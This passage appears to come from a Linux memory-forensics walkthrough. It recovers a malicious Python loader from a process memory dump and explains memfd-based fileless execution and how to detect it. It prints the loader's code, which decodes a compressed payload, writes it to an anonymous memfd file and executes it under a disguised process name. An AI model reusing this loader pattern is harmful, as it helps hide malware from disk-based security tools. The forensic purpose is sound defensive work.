+pid.28333.vma.0x560fa29e3000-0x560fa2a04000.dmp:import requests,
+pid.28333.vma.0x560fa29e3000-0x560fa2a04000.dmp:import requests,
+pid.28333.vma.0x7ffcda40f000-0x7ffcda430000.dmp:import requests,
+pid.28334.vma.0x556ea9abd000-0x556ea9ade000.dmp:import requests,
+pid.28334.vma.0x556ea9abd000-0x556ea9ade000.dmp:import requests,
+pid.28334.vma.0x7ffdd1469000-0x7ffdd148a000.dmp:import requests,
+pid.28342.vma.0x7ffd0f970000-0x7ffd0f991000.dmp:import requests,
+pid.28343.vma.0x7f2e104b3000-0x7f2e10b18000.dmp:import ctypes,
+pid.28343.vma.0x7ffd6d21c000-0x7ffd6d23d000.dmp:import requests,
+pid.852.vma.0x55576bef2000-0x55576bf13000.dmp:import requests,
+pid.852.vma.0x7ffd867d0000-0x7ffd867f1000.dmp:import requests,
+pid.852.vma.0x7ffd867d0000-0x7ffd867f1000.dmp:import requests,
+```
+
+It looks like `pid.28343.vma.0x7f2e104b3000-0x7f2e10b18000.dmp` is the file that you are looking for:
+
+```bash
+linuxforensics@ubuntu:~$ strings -a pid.28343.vma.0x7f2e104b3000-0x7f2e10b18000.dmp | head -n 4
+
+import ctypes, os, base64, zlib
+l = ctypes.CDLL(None)
+s = l.syscall
+c = base64.b64decode(
+```
+
+Save script content to `malicious_script.py`:
+
+```bash
+linuxforensics@ubuntu:~$ strings -a pid.28343.vma.0x7f2e104b3000-0x7f2e10b18000.dmp | head -n 12 > malicious_script.py
+```
+
+Malicious script content:
+
+```
+l = ctypes.CDLL(None)
+s = l.syscall
+c = base64.b64decode(
+b'eNrsvXlcVOX3OH4HGBZFZ3CLzIUSCzINShNKFBD0koPivp…5m/H/QcbsbeM8bxf/RaNP13PdiPjsKUl2QmO21fKY/uZRdf1TDq1j1Zpv+6odIv2KuyzvLT//wciuKnC'
+e = zlib.decompress(c)
+f = s(319, '', 1)
+os.write(f, e)
+print(f)
+p = '/proc/self/fd/%d' % f
+os.execle(p, 'smd', {})
+```
+
+After decompressing the base64-encoded text, malware invokes syscall number 319 with arguments that match [memfd_create](https://man7.org/linux/man-pages/man2/memfd_create.2.html) and executes it with the process name `smd`.
+
+The memory file descriptor, [memfd](https://man7.org/linux/man-pages/man2/memfd_create.2.html), is a Linux feature that allows the creation of anonymous memory backed file objects that can be used for various purposes, such as inter-process communication or tempory storage. Threat actors sometimes abuse this Linux feature to execute payloads without writing them to disk, and thus avoid traditional security tools that rely on basic binary scans. Once the payload is placed within memory section created via `memfd`, attackers can invoke one of the exec syscalls on that memory content, treating it as if it were a regular file on disk, and thereby launch a new process.
+
+Live processes executed from `memfd` can be identified on an up-and-running workload by inspecting the symbolic link of `/proc/<pid>/exe`, which begins with the `/memfd:` prefix.
+
